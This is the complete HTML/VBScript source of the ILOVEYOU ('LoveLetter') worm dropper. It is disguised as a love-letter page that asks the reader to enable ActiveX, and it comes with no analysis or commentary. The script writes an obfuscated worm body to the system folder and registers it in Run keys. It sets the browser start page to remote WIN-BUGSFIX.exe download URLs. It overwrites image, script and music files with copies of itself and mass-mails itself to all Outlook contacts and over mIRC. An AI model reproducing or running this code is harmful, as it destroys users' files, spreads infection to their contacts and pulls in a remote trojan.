<HTML><HEAD><TITLE>LOVELETTER - HTML</TITLE><META NAME="Generator" CONTENT="BAROK VBS - LOVELETTER">
<META NAME="Author" CONTENT="spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila, Philippines / March 2000">
<META NAME="Description" CONTENT="simple but i think this is good...">
</HEAD><BODY ONMOUSEOUT="window.name='main';window.open('LOVE-LETTER-FOR-YOU.HTM','main')" 
ONKEYDOWN="window.name='main';window.open('LOVE-LETTER-FOR-YOU.HTM','main')" BGPROPERTIES="fixed" BGCOLOR="#FF9933">
<CENTER><p>This HTML file need ActiveX Control</p><p>To Enable to read this HTML file<BR>- Please press 'YES' button to Enable ActiveX</p>
</CENTER><MARQUEE LOOP="infinite" BGCOLOR="yellow">----------z--------------------z----------</MARQUEE> 
</BODY></HTML>
<SCRIPT language="JScript">
<!--//
if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}
//-->
</SCRIPT>
<SCRIPT LANGUAGE="VBScript">
<!--
on error resume next
dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit
aw=1
code="rem  barok -loveletter(vbe) <i hate go to school>"&vbcrlf& _
"rem                     by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow"&vbcrlf& _
"eq=]-]]-]"&vbcrlf& _
"ctr=0"&vbcrlf& _
""&vbcrlf& _
"rem - vytvooen� objektu pro pr�ci se syst�mem soubor�"&vbcrlf& _
"Set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
""&vbcrlf& _
"rem - otevoen� sebe sama"&vbcrlf& _
"set file = fso.OpenTextFile(WScript.ScriptFullname,1)"&vbcrlf& _
""&vbcrlf& _
"rem - ulozen� obsahu scriptu do prom�nn�, pozd�ji se pouz�v� k poeps�n� soubor�"&vbcrlf& _
"vbscopy=file.ReadAll"&vbcrlf& _
""&vbcrlf& _
"main()"&vbcrlf& _
""&vbcrlf& _
"sub main()"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim wscr,rr"&vbcrlf& _
"set wscr=CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"rr=wscr.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows Scripting Host%-%Settings%-%Timeout]-])"&vbcrlf& _
"if (rr>=1) then"&vbcrlf& _
"wscr.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows Scripting Host%-%Settings%-%Timeout]-],0,]-]REG_DWORD]-]"&vbcrlf& _
"end if"&vbcrlf& _
""&vbcrlf& _
"rem - ukl�d�n� syst�movych slozek do prom�nnych"&vbcrlf& _
""&vbcrlf& _
"Set dirwin = fso.GetSpecialFolder(0)"&vbcrlf& _
"Set dirsystem = fso.GetSpecialFolder(1)"&vbcrlf& _
"Set dirtemp = fso.GetSpecialFolder(2)"&vbcrlf& _
"Set c = fso.GetFile(WScript.ScriptFullName)"&vbcrlf& _
"c.Copy(dirsystem&]-]%-%MSKernel32.vbs]-])"&vbcrlf& _
"c.Copy(dirwin&]-]%-%Win32DLL.vbs]-])"&vbcrlf& _
"c.Copy(dirsystem&]-]%-%LOVE-LETTER-FOR-YOU.TXT.vbs]-])"&vbcrlf& _
""&vbcrlf& _
"regruns()"&vbcrlf& _
"html()"&vbcrlf& _
"spreadtoemail()"&vbcrlf& _
""&vbcrlf& _
"rem  - za��n�me mazat"&vbcrlf& _
"listadriv()"&vbcrlf& _
""&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"sub regruns()"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"Dim num,downread"&vbcrlf& _
"regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%Run%-%MSKernel32]-],dirsystem&]-]%-%MSKernel32.vbs]-]"&vbcrlf& _
"regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%RunServices%-%Win32DLL]-],dirwin&]-]%-%Win32DLL.vbs]-]"&vbcrlf& _
"downread=]-]]-]"&vbcrlf& _
"downread=regget(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Internet Explorer%-%Download Directory]-])"&vbcrlf& _
"if (downread=]-]]-]) then"&vbcrlf& _
"downread=]-]c:%-%]-]"&vbcrlf& _
"end if"&vbcrlf& _
"if (fileexist(dirsystem&]-]%-%WinFAT32.exe]-])=1) then"&vbcrlf& _
"Randomize"&vbcrlf& _
"num = Int((4 * Rnd) + 1)"&vbcrlf& _
"if num = 1 then"&vbcrlf& _
"regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"elseif num = 2 then"&vbcrlf& _
"regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"elseif num = 3 then"&vbcrlf& _
"regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"elseif num = 4 then"&vbcrlf& _
"regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"if (fileexist(downread&]-]%-%WIN-BUGSFIX.exe]-])=0) then"&vbcrlf& _
"regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%Run%-%WIN-BUGSFIX]-],downread&]-]%-%WIN-BUGSFIX.exe]-]"&vbcrlf& _
"regcreate ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]about:blank]-]"&vbcrlf& _
"end if"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"sub listadriv"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"Dim d,dc,s"&vbcrlf& _
"Set dc = fso.Drives"&vbcrlf& _
""&vbcrlf& _
"rem - proch�zen� diskovych jednotek, 2 - pevny disk, 3 - s�_ovy disk"&vbcrlf& _
""&vbcrlf& _
"For Each d in dc"&vbcrlf& _
"If d.DriveType = 2 or d.DriveType=3 Then"&vbcrlf& _
"folderlist(d.path&]-]%-%]-])"&vbcrlf& _
"end if"&vbcrlf& _
"Next"&vbcrlf& _
"listadriv = s"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"sub infectfiles(folderspec)  "&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim f,f1,fc,ext,ap,mircfname,s,bname,mp3"&vbcrlf& _
"set f = fso.GetFolder(folderspec)"&vbcrlf& _
"set fc = f.Files"&vbcrlf& _
""&vbcrlf& _
"rem - proch�zen� soubor� v poedan� slozce"&vbcrlf& _
""&vbcrlf& _
"for each f1 in fc"&vbcrlf& _
""&vbcrlf& _
"rem - zjist�n� po�pony souboru"&vbcrlf& _
""&vbcrlf& _
"ext=fso.GetExtensionName(f1.path)"&vbcrlf& _
"ext=lcase(ext)"&vbcrlf& _
"s=lcase(f1.name)"&vbcrlf& _
"if (ext=]-]vbs]-]) or (ext=]-]vbe]-]) then"&vbcrlf& _
"set ap=fso.OpenTextFile(f1.path,2,true)"&vbcrlf& _
"ap.write vbscopy"&vbcrlf& _
"ap.close"&vbcrlf& _
"elseif(ext=]-]js]-]) or (ext=]-]jse]-]) or (ext=]-]css]-]) or (ext=]-]wsh]-]) or (ext=]-]sct]-]) or (ext=]-]hta]-]) then"&vbcrlf& _
"set ap=fso.OpenTextFile(f1.path,2,true)"&vbcrlf& _
""&vbcrlf& _
"rem - z�pis vypisu scriptu do souboru (viz o�dek 15)"&vbcrlf& _
""&vbcrlf& _
"ap.write vbscopy"&vbcrlf& _
"ap.close"&vbcrlf& _
"bname=fso.GetBaseName(f1.path)"&vbcrlf& _
"set cop=fso.GetFile(f1.path)"&vbcrlf& _
"cop.copy(folderspec&]-]%-%]-]&bname&]-].vbs]-])"&vbcrlf& _
"fso.DeleteFile(f1.path)"&vbcrlf& _
"elseif(ext=]-]jpg]-]) or (ext=]-]jpeg]-]) then"&vbcrlf& _
"set ap=fso.OpenTextFile(f1.path,2,true)"&vbcrlf& _
"ap.write vbscopy"&vbcrlf& _
"ap.close"&vbcrlf& _
"set cop=fso.GetFile(f1.path)"&vbcrlf& _
"cop.copy(f1.path&]-].vbs]-])"&vbcrlf& _
"fso.DeleteFile(f1.path)"&vbcrlf& _
"elseif(ext=]-]mp3]-]) or (ext=]-]mp2]-]) then"&vbcrlf& _
"set mp3=fso.CreateTextFile(f1.path&]-].vbs]-])"&vbcrlf& _
"mp3.write vbscopy"&vbcrlf& _
"mp3.close"&vbcrlf& _
"set att=fso.GetFile(f1.path)"&vbcrlf& _
"att.attributes=att.attributes+2"&vbcrlf& _
"end if"&vbcrlf& _
"if (eq<>folderspec) then"&vbcrlf& _
"if (s=]-]mirc32.exe]-]) or (s=]-]mlink32.exe]-]) or (s=]-]mirc.ini]-]) or (s=]-]script.ini]-]) or (s=]-]mirc.hlp]-]) then"&vbcrlf& _
"set scriptini=fso.CreateTextFile(folderspec&]-]%-%script.ini]-])"&vbcrlf& _
"scriptini.WriteLine ]-][script]]-]"&vbcrlf& _
"scriptini.WriteLine ]-];mIRC Script]-]"&vbcrlf& _
"scriptini.WriteLine ]-];  Please dont edit this script... mIRC will corrupt, if mIRC will]-]"&vbcrlf& _
"scriptini.WriteLine ]-]     corrupt... WINDOWS will affect and will not run correctly. thanks]-]"&vbcrlf& _
"scriptini.WriteLine ]-];]-]"&vbcrlf& _
"scriptini.WriteLine ]-];Khaled Mardam-Bey]-]"&vbcrlf& _
"scriptini.WriteLine ]-];http://www.mirc.com]-]"&vbcrlf& _
"scriptini.WriteLine ]-];]-]"&vbcrlf& _
"scriptini.WriteLine ]-]n0=on 1:JOIN:#:{]-]"&vbcrlf& _
"scriptini.WriteLine ]-]n1=  /if ( $nick == $me ) { halt }]-]"&vbcrlf& _
"scriptini.WriteLine ]-]n2=  /.dcc send $nick ]-]&dirsystem&]-]%-%LOVE-LETTER-FOR-YOU.HTM]-]"&vbcrlf& _
"scriptini.WriteLine ]-]n3=}]-]"&vbcrlf& _
"scriptini.close"&vbcrlf& _
"eq=folderspec"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"next  "&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"sub folderlist(folderspec)  "&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim f,f1,sf"&vbcrlf& _
"set f = fso.GetFolder(folderspec)  "&vbcrlf& _
"set sf = f.SubFolders"&vbcrlf& _
"rem - proch�zen� podadres�ou"&vbcrlf& _
"for each f1 in sf"&vbcrlf& _
"rem - adres�o pro poepis soubor�"&vbcrlf& _
"infectfiles(f1.path)"&vbcrlf& _
"rem - rekurzivn� vol�n� na prohled�v�n� podadres�o�"&vbcrlf& _
"folderlist(f1.path)"&vbcrlf& _
"next  "&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"sub regcreate(regkey,regvalue)"&vbcrlf& _
"Set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"regedit.RegWrite regkey,regvalue"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"function regget(value)"&vbcrlf& _
"Set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"regget=regedit.RegRead(value)"&vbcrlf& _
"end function"&vbcrlf& _
"function fileexist(filespec)"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim msg"&vbcrlf& _
"if (fso.FileExists(filespec)) Then"&vbcrlf& _
"msg = 0"&vbcrlf& _
"else"&vbcrlf& _
"msg = 1"&vbcrlf& _
"end if"&vbcrlf& _
"fileexist = msg"&vbcrlf& _
"end function"&vbcrlf& _
"function folderexist(folderspec)"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim msg"&vbcrlf& _
"if (fso.GetFolderExists(folderspec)) then"&vbcrlf& _
"msg = 0"&vbcrlf& _
"else"&vbcrlf& _
"msg = 1"&vbcrlf& _
"end if"&vbcrlf& _
"fileexist = msg"&vbcrlf& _
"end function"&vbcrlf& _
""&vbcrlf& _
"rem - ��st pro odesl�n� viru e-mailem"&vbcrlf& _
""&vbcrlf& _
"sub spreadtoemail()"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad"&vbcrlf& _
"set regedit=CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"set out=WScript.CreateObject(]-]Outlook.Application]-])"&vbcrlf& _
"set mapi=out.GetNameSpace(]-]MAPI]-])"&vbcrlf& _
"for ctrlists=1 to mapi.AddressLists.Count"&vbcrlf& _
"set a=mapi.AddressLists(ctrlists)"&vbcrlf& _
"x=1"&vbcrlf& _
"regv=regedit.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&a)"&vbcrlf& _
"if (regv=]-]]-]) then"&vbcrlf& _
"regv=1"&vbcrlf& _
"end if"&vbcrlf& _
"if (int(a.AddressEntries.Count)>int(regv)) then"&vbcrlf& _
"for ctrentries=1 to a.AddressEntries.Count"&vbcrlf& _
"malead=a.AddressEntries(x)"&vbcrlf& _
"regad=]-]]-]"&vbcrlf& _
"regad=regedit.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&malead)"&vbcrlf& _
"if (regad=]-]]-]) then"&vbcrlf& _
"set male=out.CreateItem(0)"&vbcrlf& _
"male.Recipients.Add(malead)"&vbcrlf& _
"male.Subject = ]-]ILOVEYOU]-]"&vbcrlf& _
"male.Body = vbcrlf&]-]kindly check the attached LOVELETTER coming from me.]-]"&vbcrlf& _
"male.Attachments.Add(dirsystem&]-]%-%LOVE-LETTER-FOR-YOU.TXT.vbs]-])"&vbcrlf& _
"male.Send"&vbcrlf& _
"regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&malead,1,]-]REG_DWORD]-]"&vbcrlf& _
"end if"&vbcrlf& _
"x=x+1"&vbcrlf& _
"next"&vbcrlf& _
"regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&a,a.AddressEntries.Count"&vbcrlf& _
"else"&vbcrlf& _
"regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&a,a.AddressEntries.Count"&vbcrlf& _
"end if"&vbcrlf& _
"next"&vbcrlf& _
"Set out=Nothing"&vbcrlf& _
"Set mapi=Nothing"&vbcrlf& _
"end sub"&vbcrlf& _
"sub html"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6"&vbcrlf& _
"dta1=]-]<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>]-]&vbcrlf& _"&vbcrlf& _
"]-]<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>]-]&vbcrlf& _"&vbcrlf& _
"]-]<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>]-]&vbcrlf& _"&vbcrlf& _
"]-]<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ ]-]&vbcrlf& _"&vbcrlf& _
"]-]ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>]-]&vbcrlf& _"&vbcrlf& _
"]-]<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>]-]&vbcrlf& _"&vbcrlf& _
"]-]<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> ]-]&vbcrlf& _"&vbcrlf& _
"]-]<?-?BODY><?-?HTML>]-]&vbcrlf& _"&vbcrlf& _
"]-]<SCRIPT language=@-@JScript@-@>]-]&vbcrlf& _"&vbcrlf& _
"]-]<!--?-??-?]-]&vbcrlf& _"&vbcrlf& _
"]-]if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}]-]&vbcrlf& _"&vbcrlf& _
"]-]?-??-?-->]-]&vbcrlf& _"&vbcrlf& _
"]-]<?-?SCRIPT>]-]&vbcrlf& _"&vbcrlf& _
"]-]<SCRIPT LANGUAGE=@-@VBScript@-@>]-]&vbcrlf& _"&vbcrlf& _
"]-]<!--]-]&vbcrlf& _"&vbcrlf& _
"]-]on error resume next]-]&vbcrlf& _"&vbcrlf& _
"]-]dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit]-]&vbcrlf& _"&vbcrlf& _
"]-]aw=1]-]&vbcrlf& _"&vbcrlf& _
"]-]code=]-]"&vbcrlf& _
"dta2=]-]set fso=CreateObject(@-@Scripting.FileSystemObject@-@)]-]&vbcrlf& _"&vbcrlf& _
"]-]set dirsystem=fso.GetSpecialFolder(1)]-]&vbcrlf& _"&vbcrlf& _
"]-]code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))]-]&vbcrlf& _"&vbcrlf& _
"]-]code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))]-]&vbcrlf& _"&vbcrlf& _
"]-]code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))]-]&vbcrlf& _"&vbcrlf& _
"]-]set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)]-]&vbcrlf& _"&vbcrlf& _
"]-]wri.write code4]-]&vbcrlf& _"&vbcrlf& _
"]-]wri.close]-]&vbcrlf& _"&vbcrlf& _
"]-]if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then]-]&vbcrlf& _"&vbcrlf& _
"]-]if (err.number=424) then]-]&vbcrlf& _"&vbcrlf& _
"]-]aw=0]-]&vbcrlf& _"&vbcrlf& _
"]-]end if]-]&vbcrlf& _"&vbcrlf& _
"]-]if (aw=1) then]-]&vbcrlf& _"&vbcrlf& _
"]-]document.write @-@ERROR: can#-#t initialize ActiveX@-@]-]&vbcrlf& _"&vbcrlf& _
"]-]window.close]-]&vbcrlf& _"&vbcrlf& _
"]-]end if]-]&vbcrlf& _"&vbcrlf& _
"]-]end if]-]&vbcrlf& _"&vbcrlf& _
"]-]Set regedit = CreateObject(@-@WScript.Shell@-@)]-]&vbcrlf& _"&vbcrlf& _
"]-]regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@]-]&vbcrlf& _"&vbcrlf& _
"]-]?-??-?-->]-]&vbcrlf& _"&vbcrlf& _
"]-]<?-?SCRIPT>]-]"&vbcrlf& _
"dt1=replace(dta1,chr(35)&chr(45)&chr(35),]-][-[]-])"&vbcrlf& _
"dt1=replace(dt1,chr(64)&chr(45)&chr(64),]-]]-]]-]]-])"&vbcrlf& _
"dt4=replace(dt1,chr(63)&chr(45)&chr(63),]-]/]-])"&vbcrlf& _
"dt5=replace(dt4,chr(94)&chr(45)&chr(94),]-]%-%]-])"&vbcrlf& _
"dt2=replace(dta2,chr(35)&chr(45)&chr(35),]-][-[]-])"&vbcrlf& _
"dt2=replace(dt2,chr(64)&chr(45)&chr(64),]-]]-]]-]]-])"&vbcrlf& _
"dt3=replace(dt2,chr(63)&chr(45)&chr(63),]-]/]-])"&vbcrlf& _
"dt6=replace(dt3,chr(94)&chr(45)&chr(94),]-]%-%]-])"&vbcrlf& _
"set fso=CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
"set c=fso.OpenTextFile(WScript.ScriptFullName,1)"&vbcrlf& _
"lines=Split(c.ReadAll,vbcrlf)"&vbcrlf& _
"l1=ubound(lines)"&vbcrlf& _
"for n=0 to ubound(lines)"&vbcrlf& _
"lines(n)=replace(lines(n),]-][-[]-],chr(91)+chr(45)+chr(91))"&vbcrlf& _
"lines(n)=replace(lines(n),]-]]-]]-]]-],chr(93)+chr(45)+chr(93))"&vbcrlf& _
"lines(n)=replace(lines(n),]-]%-%]-],chr(37)+chr(45)+chr(37))"&vbcrlf& _
"if (l1=n) then"&vbcrlf& _
"lines(n)=chr(34)+lines(n)+chr(34)"&vbcrlf& _
"else"&vbcrlf& _
"lines(n)=chr(34)+lines(n)+chr(34)&]-]&vbcrlf& _]-]"&vbcrlf& _
"end if"&vbcrlf& _
"next"&vbcrlf& _
"set b=fso.CreateTextFile(dirsystem+]-]%-%LOVE-LETTER-FOR-YOU.HTM]-])"&vbcrlf& _
"b.close"&vbcrlf& _
"set d=fso.OpenTextFile(dirsystem+]-]%-%LOVE-LETTER-FOR-YOU.HTM]-],2)"&vbcrlf& _
"d.write dt5"&vbcrlf& _
"d.write join(lines,vbcrlf)"&vbcrlf& _
"d.write vbcrlf"&vbcrlf& _
"d.write dt6"&vbcrlf& _
"d.close"&vbcrlf& _
"end sub"&vbcrlf& _
""
set fso=CreateObject("Scripting.FileSystemObject")
set dirsystem=fso.GetSpecialFolder(1)
code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))
code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))
code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))
set wri=fso.CreateTextFile(dirsystem&"\MSKernel32.vbs")
wri.write code4
wri.close
if (fso.FileExists(dirsystem&"\MSKernel32.vbs")) then
if (err.number=424) then
aw=0
end if
if (aw=1) then
document.write "ERROR: can't initialize ActiveX"
window.close
end if
end if
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
//-->
</SCRIPT>